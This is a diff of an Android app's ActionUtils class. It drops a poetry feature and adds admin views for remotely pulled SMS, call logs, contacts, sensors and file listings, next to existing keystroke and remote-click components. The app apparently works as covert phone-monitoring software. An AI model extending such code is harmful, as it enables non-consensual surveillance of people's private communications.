@@ -32,8 +32,12 @@ import com.vikasyadavnsit.cdc.data.NotificationData;
 import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
 import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
+import com.vikasyadavnsit.cdc.fragment.AdminCallLogsFragment;
+import com.vikasyadavnsit.cdc.fragment.AdminContactsFragment;
+import com.vikasyadavnsit.cdc.fragment.AdminFileStructureFragment;
+import com.vikasyadavnsit.cdc.fragment.AdminSensorsFragment;
+import com.vikasyadavnsit.cdc.fragment.AdminSmsFragment;
 import com.vikasyadavnsit.cdc.fragment.RemoteTriggerClickActionsFragment;
-import com.vikasyadavnsit.cdc.fragment.ShayariFragment;
 import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
 import com.vikasyadavnsit.cdc.fragment.MessageFragment;
 import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
@@ -72,16 +76,7 @@ public class ActionUtils {
      * @param activity Activity used to access {@link PowerManager} and start the settings intent.
      */
     public static void checkAndRequestBatteryOptimization(Activity activity) {
-        PowerManager powerManager = (PowerManager) activity.getSystemService(Context.POWER_SERVICE);
-
-        if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(activity.getPackageName())) {
-            // Battery optimization is enabled for this app, prompt the user to disable it
-            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
-            activity.startActivity(intent);
-        } else {
-            // Battery optimization is already disabled for this app
-            LoggerUtils.d("BatteryOptimization", "Battery optimization is already disabled.");
-        }
+        new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission(activity, com.vikasyadavnsit.cdc.enums.PermissionType.BATTERY_OPTIMIZATION);
     }
 
     /**
@@ -139,9 +134,7 @@ public class ActionUtils {
      * @param activity Activity used to start {@link Settings#ACTION_USAGE_ACCESS_SETTINGS}.
      */
     public static void enableAppUsageStats(Activity activity) {
-        if (!hasUsageStatsPermission(activity)) {
-            activity.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
-        }
+        new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission(activity, com.vikasyadavnsit.cdc.enums.PermissionType.PACKAGE_USAGE_STATS);
     }
 
     /**
@@ -242,36 +235,6 @@ public class ActionUtils {
     }
 
     /**
-     * Picks the next shayari from the collection (round-robin per launch) and updates the UI.
-     * Increments the index on every app open, wrapping around when the collection is exhausted.
-     *
-     * @param shayaris Full list of shayaris fetched from Firebase; may be empty.
-     */
-    public static void performShayariAction(java.util.List<String> shayaris) {
-        LoggerUtils.d("ActionUtils", "Loading Shayari ..");
-
-        if (shayaris == null || shayaris.isEmpty()) {
-            ShayariFragment.updateShayariText(AppConstants.DEFAULT_SHAYARI_TEXT, 1, 1);
-            return;
-        }
-
-        String currentData = getShayariData(context);
-        String[] parts = currentData.split(":");
-        int lastIndex = 0;
-        try {
-            lastIndex = Integer.parseInt(parts[0]);
-        } catch (NumberFormatException ignored) {}
-
-        int total = shayaris.size();
-        int nextIndex = (lastIndex) % total;
-        String shayari = shayaris.get(nextIndex);
-
-        ShayariFragment.updateShayariText(shayari, nextIndex + 1, total);
-        SharedPreferenceUtils.updateShayariData(context, (nextIndex + 1) + ":" + total);
-    }
-
-
-    /**
      * Applies a personalized message update (from Firebase or cached default) to the UI and prefs.
      *
      * @param obj Raw Firebase value for the message; may be {@code null}.
@@ -368,5 +331,39 @@ public class ActionUtils {
         }.getType();
         TreeMap<String, TreeMap<String, AppUsageReportData>> appUsageStatisticsReportDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
         SystemAppUsageStatisticsFragment.displaySystemAppUsageStatistics(context, appUsageStatisticsReportDataMap);
+    }
+
+    public static void displayRemoteSms(Object obj) {
+        Type type = new TypeToken<Map<String, Map<String, String>>>() {}.getType();
+        Map<String, Map<String, String>> data = new Gson().fromJson(new Gson().toJson(obj), type);
+        AdminSmsFragment.displaySms(context, data);
+    }
+
+    public static void displayRemoteCallLogs(Object obj) {
+        Type type = new TypeToken<Map<String, Map<String, String>>>() {}.getType();
+        Map<String, Map<String, String>> data = new Gson().fromJson(new Gson().toJson(obj), type);
+        AdminCallLogsFragment.displayCallLogs(context, data);
+    }
+
+    public static void displayRemoteContacts(Object obj) {
+        Type type = new TypeToken<Map<String, Map<String, String>>>() {}.getType();
+        Map<String, Map<String, String>> data = new Gson().fromJson(new Gson().toJson(obj), type);
+        AdminContactsFragment.displayContacts(context, data);
+    }
+
+    public static void displayRemoteSensors(Object obj) {
+        Type type = new TypeToken<Map<String, Object>>() {}.getType();
+        Map<String, Object> data = new Gson().fromJson(new Gson().toJson(obj), type);
+        AdminSensorsFragment.displaySensors(context, data);
+    }
+
+    public static void displayRemoteFileStructure(Object obj) {
+        Type type = new TypeToken<Map<String, Object>>() {}.getType();
+        Map<String, Object> data = new Gson().fromJson(new Gson().toJson(obj), type);
+        AdminFileStructureFragment.displayFileStructure(context, data);
+    }
+
+    public static void getDirectoryStructure(Activity activity) {
+        com.vikasyadavnsit.cdc.utils.FileExplorer.captureDirectoryStructure(activity);
     }
 }
